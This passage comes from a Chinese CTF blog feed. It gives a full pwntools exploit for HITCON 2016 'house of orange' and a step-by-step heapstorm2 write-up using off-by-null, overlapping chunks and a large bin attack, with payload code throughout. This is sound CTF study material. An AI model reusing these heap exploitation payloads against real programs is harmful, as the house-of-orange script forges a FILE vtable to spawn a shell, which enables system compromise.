ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./houseoforange_hitcon_2016'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'../libc/libc-2.23.so'</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice : '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Name :'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Orange:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Orange:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xddaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice : '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice : '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Name:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Orange:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Orange:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xddaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment">#rs()</span>
rs<span class="token punctuation">(</span><span class="token string">'remote'</span><span class="token punctuation">)</span>
<span class="token comment"># print(ctx.libc.path)</span>

add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>

fake_name <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x80</span>
fake_name <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token comment"># color chunk: pre_size, size 不必要伪造，直接随便覆盖也行</span>
fake_name <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xddaa</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># color structure</span>
fake_name <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf31</span><span class="token punctuation">)</span> <span class="token comment"># top chunk: pre_size, size</span>

edit<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>fake_name<span class="token punctuation">)</span><span class="token punctuation">,</span> fake_name<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># free top chunk</span>

add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 从unsorted bin中切割一块出来 'a' * 8 是fd，后面就是bk</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
lbase <span class="token operator">=</span> addr <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7dd2188</span> <span class="token operator">-</span> <span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
hbase <span class="token operator">=</span> addr <span class="token operator">&amp;</span> <span class="token number">0xffFFffFFffFFf000</span>
leak<span class="token punctuation">(</span><span class="token string">'hbase'</span><span class="token punctuation">,</span> hbase<span class="token punctuation">)</span>

_IO_list_all <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>
leak<span class="token punctuation">(</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">,</span> _IO_list_all<span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x400</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xddaa</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

chunk_addr <span class="token operator">=</span> hbase <span class="token operator">+</span> <span class="token number">0x560</span>

fake_file <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token comment"># pre_size, size</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_list_all<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment"># fd, bk</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># _IO_write_base, _IO_write_ptr</span>
fake_file <span class="token operator">=</span> fake_file<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># _mode</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span>chunk_addr <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># vtable</span>

fake_vtable <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
fake_vtable <span class="token operator">+=</span> p64<span class="token punctuation">(</span>lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># _IO_OVERFLOW</span>

pay <span class="token operator">+=</span> fake_file <span class="token operator">+</span> fake_vtable


<span class="token comment">#dbg('watch %s' % hex(_IO_list_all))</span>

edit<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>

<span class="token comment">#add(0x400, 'aaa')</span>

sla<span class="token punctuation">(</span><span class="token string">'choice : '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>


irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>












]]></content>
      <categories>
        <category>buuoj题目复现</category>
      </categories>
      <tags>
        <tag>house of orange</tag>
        <tag>unsorted bin attack</tag>
      </tags>
  </entry>
  <entry>
    <title>0ctf_2018_heapstorm2</title>
    <url>/851af66/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>buuoj刷pwn题之0ctf_2018_heapstorm2</p>
<span id="more"></span>


<p><strong>参考文章</strong>:<br><a href="https://bbs.pediy.com/thread-225973.htm">https://bbs.pediy.com/thread-225973.htm</a></p>
<p>当然是保护全开啦<br><img src="/images/851af66/1.png" alt="upload successful"></p>
<p>关闭了fastbin<br><img src="/images/851af66/2.png" alt="upload successful"></p>
<p>有add，edit，delete，show</p>
<p>malloc的指针都和随机数异或后存储<br><img src="/images/851af66/3.png" alt="upload successful"><br><img src="/images/851af66/4.png" alt="upload successful"></p>
<p>莫得fastbin，要large bin attack</p>
<p>edit功能有off by null的缺陷<br><img src="/images/851af66/5.png" alt="upload successful"></p>
<p>可以利用这个off by null来制造overlap chunk</p>
<p>通过edit，伪造接下来要用上的pre_size</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
add<span class="token punctuation">(</span><span class="token number">0x508</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>

<span class="token comment"># 待会mallc(0x18)的时候，会根据1找到下一个chunk的pre_size，与size相等才通过检查</span>
edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token operator">*</span> <span class="token number">0x4f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># next = chunk+size(改成0x500)</span>


add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 3</span>
add<span class="token punctuation">(</span><span class="token number">0x508</span><span class="token punctuation">)</span> <span class="token comment"># 4</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 5</span>
edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token operator">*</span> <span class="token number">0x4f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>情况如下<br><img src="/images/851af66/6.png" alt="upload successful"><br><img src="/images/851af66/7.png" alt="upload successful"></p>
<p>将chunk1给free掉，然后修改chunk0，off by null将chunk1的size改掉</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># chunk2 pre_size=0x510, inuse=0</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># chunk1 size=0x500</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>可以看到，chunk1的size最低字节改成了<code>\x00</code>，从原来的0x510变成了0x500<br><img src="/images/851af66/8.png" alt="upload successful"></p>
<p>同时，chunk2的inused位变成了0，因为他的前一个chunk(chunk1)已经free了<br><img src="/images/851af66/9.png" alt="upload successful"></p>
<p>此时再malloc，会从之前的释放的chunk1从分配，因为size已经修改成了0x500，那么下一个chunk的位置就是chunk1+0x500，这个位置是之前构造的pre_size，也是0x500，所以通过检查，可以malloc</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x4d8</span><span class="token punctuation">)</span> <span class="token comment"># 7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/images/851af66/10.png" alt="upload successful"></p>
<p>此时再释放1和2，要注意2的inused是0，那么chunk1和chunk2会合并入unsorted bin</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># chunk1+chunk2合并，node7指向chunk1+0x20+0x10</span>
free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>而此时的7还可以控制chunk1与chunk2合并后的区域</p>
<p><img src="/images/851af66/11.png" alt="upload successful"></p>
<p><img src="/images/851af66/12.png" alt="upload successful"></p>
<p>然后把这块chunk，再malloc出来</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x4e8</span><span class="token punctuation">)</span> <span class="token comment"># 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>1和7就重叠了<br><img src="/images/851af66/13.png" alt="upload successful"></p>
<p>重复一遍操作</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 4</span>
add<span class="token punctuation">(</span><span class="token number">0x4d8</span><span class="token punctuation">)</span> <span class="token comment"># 8</span>
free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token comment"># 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>4和8也重叠了<br><img src="/images/851af66/14.png" alt="upload successful"></p>
<p>此时unsorted bin里面还有之前free的4的一部分块(add(0x48)后切割剩下的)<br><img src="/images/851af66/15.png" alt="upload successful"></p>
<p>此时将2释放，再分配，0x5555557575c0就被安排到large bin里</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x4e8</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/images/851af66/16.png" alt="upload successful"></p>
<p>然后再释放2，这样就把2放到unsorted bin里了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/851af66/17.png" alt="upload successful"></p>
<p>通过之前的7可以修改free掉的2，改掉bk</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4f1</span><span class="token punctuation">)</span> <span class="token comment"># size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span> <span class="token comment"># bk</span>
edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/851af66/18.png" alt="upload successful"></p>
<p>再一波伪造</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># modify fake chunk size</span>
storage <span class="token operator">=</span> <span class="token number">0x13370000</span> <span class="token operator">+</span> <span class="token number">0x800</span>
fake_chunk <span class="token operator">=</span> storage <span class="token operator">-</span> <span class="token number">0x20</span>

pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4f1</span><span class="token punctuation">)</span> <span class="token comment"># size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span> <span class="token comment"># bk</span>
edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>

pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4e1</span><span class="token punctuation">)</span> <span class="token comment"># size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># bk</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment"># bk_nextsize</span>
edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/images/851af66/19.png" alt="upload successful"></p>
<p>这里参考了文章，再malloc一下，将会出现unsorted bin中的chunk，扔进large bin的操作(有个检查)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>
    ru<span class="token punctuation">(</span><span class="token string">'1.'</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
    <span class="token keyword">continue</span>

<span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>copy一下关键源码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>
fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
victim<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>
bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的<code>vicitim</code>是unsorted bin中的chunk，是上图中的，<code>0xxx060</code>，而<code>fwd</code>是large bin中的chunk，为<code>0xxx5c0</code></p>
<p>这里<code>victim-&gt;bk_nextsize=fwd-&gt;bk_nextsize</code>使得<code>victim-&gt;bk_nextsize=0x133707c3</code>(0x133707c3就是前面的fake_chunk-0x18-5)</p>
<p>然后<code>victim-&gt;bk_nextsize-&gt;fd_nextsize=victim</code>，就是<code>*(0x133707c3+0x20)=*(0x133707e3)=0xxxx060</code></p>
<p>这样就修改成功了(开了ASLR后，就有可能是0x56xxxx060了)<br><img src="/images/851af66/20.png" alt="upload successful"></p>
<p>然后开头的这个<code>0x56</code>就在fake_chunk的size字段<br><img src="/images/851af66/21.png" alt="upload successful"></p>
<p>这个size要为0x56是要，满足一个检查，要开启chunk的mmap标志位置位。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">assert</span> <span class="token punctuation">(</span><span class="token operator">!</span>mem <span class="token operator">||</span> <span class="token function">chunk_is_mmapped</span> <span class="token punctuation">(</span><span class="token function">mem2chunk</span> <span class="token punctuation">(</span>mem<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
         av <span class="token operator">==</span> <span class="token function">arena_for_chunk</span> <span class="token punctuation">(</span><span class="token function">mem2chunk</span> <span class="token punctuation">(</span>mem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>IS_MAPPED位在第二位：<br><img src="/images/851af66/23.png" alt="upload successful"></p>
<p>参考ctfwiki：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/</a><br><img src="/images/851af66/22.png" alt="upload successful"></p>
<p>fake_chunk搞到了，就可以修改开头的随机数，来使用view了<br><img src="/images/851af66/24.png" alt="upload successful"></p>
<p>先让node0指向heap位置先，方便后面修改</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x13377331</span><span class="token punctuation">)</span>  <span class="token comment"># view</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token punctuation">)</span>   <span class="token comment"># node0: ptr</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/851af66/25.png" alt="upload successful"></p>
<p>之后就是leak出堆</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x13377331</span><span class="token punctuation">)</span>  <span class="token comment"># view</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>  <span class="token comment"># node0: ptr,size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x133707e3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># node1: ptr, size</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span> 

heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'heap'</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>这个chunk(0xxxx060)，的fd字段就是main_arena<br><img src="/images/851af66/26.png" alt="upload successful"></p>
<p>可leak出main_arena来计算libc的基地址</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x13377331</span><span class="token punctuation">)</span>  <span class="token comment"># view</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>  <span class="token comment"># node0: ptr,size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># node1: ptr, size</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>

